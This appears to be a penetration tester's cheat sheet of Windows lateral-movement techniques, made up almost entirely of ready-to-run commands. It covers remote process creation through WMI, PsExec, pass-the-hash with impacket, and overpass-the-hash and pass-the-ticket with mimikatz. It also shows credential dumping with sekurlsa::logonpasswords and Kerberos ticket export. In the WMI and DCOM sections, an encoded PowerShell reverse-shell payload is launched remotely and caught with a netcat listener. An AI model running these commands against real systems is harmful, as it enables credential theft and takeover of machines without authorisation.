## WMI and WinRM
To do this, you will need the credentials of someone in Administrators local group
```
Creating PSCredential Object in Powershell
$username='user';
$password='password';
$secureString= ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
-------------------------------------------------------------
Creating a CimSession
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $targetip -Credential $credential -SessionOption $Options
$command = (replace this with output of encode.py)
-------------------------------------------------------------
Invoking WMI session
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-------------------------------------------------------------
What is encode.py?
Located in ~/Documents/tools
It is a powershell payload
CHANGE THE IP BEFORE EXECUTING THE SCRIPT FOR $command
```
## PsExec (within sysinternals suite)
Requirements to do this:
1. Target User should be part of Administrators local group
2. Must have credentials for target user
```
.\PsExec64.exe -i  \\[hostname] -u [domain\user] -p [password] cmd
```
## Pass The Hash
Requirements to do this:
1. Requires SMB connection through firewall
2. Requires admin share to be available (means the user must be a local admin)
```
/usr/biimpacket-wmiexec -hashes :[NTLMHash] [user]@$ip
```
## Overpass the Hash
Allows us to get a full Kerberos TGT to get a TGS
```
First, we need to get the NTLM Hash of the target user
Run a process as the target user to get the cached hashes using mimikatz

In mimikatz,
sekurlsa::logonpasswords (to get the hash)
sekurlsa::credman (https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/credman)
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlmhash] /run:powershell

net use \\[target to lateral move]
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\[target to lateral move] cmd
```
## Pass the Ticket
```
Run mimikatz as administrator
privilege::debug
sekurlsa::tickets /export

Inspect the tickets to determine which ticket to use to inject into process memory

Exit mimikatz and dir *.kirbi
Pick the ticket to conduct lateral movement and run mimikatz again
kerberos::ptt [the ticket]

exit mimikatz and run klist to verify
```
## DCOM
```
Firstly, we need to initiate the MMC Application in Powershell
$dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$ip"))

Use encode.py to get a reverse shell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"encode.py code","7")

start nc -nvlp 443 on kali
```